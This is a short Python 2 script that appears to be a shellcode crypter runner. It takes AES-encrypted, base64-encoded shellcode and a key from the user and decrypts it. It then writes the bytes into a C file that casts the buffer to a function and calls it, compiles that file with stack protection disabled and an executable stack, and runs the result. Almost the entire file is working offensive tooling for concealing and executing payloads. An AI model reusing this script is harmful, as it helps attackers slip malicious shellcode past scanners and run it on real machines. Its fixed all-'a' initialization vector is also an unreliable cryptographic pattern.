import base64
import hashlib
import subprocess
from os import path
from Crypto.Cipher import AES
class AESCipher(object):

    def __init__(self, key):
        self.bs = AES.block_size
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = 'a'*AES.block_size
        cipher = AES.new(self.key, AES.MODE_CFB, iv)
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CFB, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:]))

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]



shellcode1=raw_input("Enter the Encrypted code:")
shellcode=base64.b64decode(shellcode1)
main_key=raw_input("Enter the Key:")
print ("key:"+main_key)
crypter_class=AESCipher(main_key)
decrypted=crypter_class.decrypt(shellcode)

print ("decrypted")
encode=""
encode2=""
for x in bytearray(decrypted):
        encode+="\\x"
        encode+="%02x"%x
        encode2+="0x"
        encode2+="%02x,"%x
print (encode)
print (encode2)
if (path.exists("skeleton.c")):
	subprocess.call(["rm","skeleton.c"])
text_file = open("skeleton.c", "w")
text_file.write("#include<stdio.h>\n"
"#include<string.h>\n"

"unsigned char code[] = \\")
text_file.close()
text_file = open("skeleton.c", "a")
text_file.write ("\n\"")
text_file.write(encode)
text_file.write("\";\n")
text_file.write("\n"
"void main()\n"
"{\n"
        "printf(\"Shellcode Length:  %d\\n\", (int)strlen(code));\n"
        "int (*ret)() = (int(*)())code;\n"
        "ret();\n"
"}\n")
text_file.close()

subprocess.call(["gcc","skeleton.c","-o", "skeleton","-fno-stack-protector","-z","execstack","-no-pie"])
subprocess.call("./skeleton")
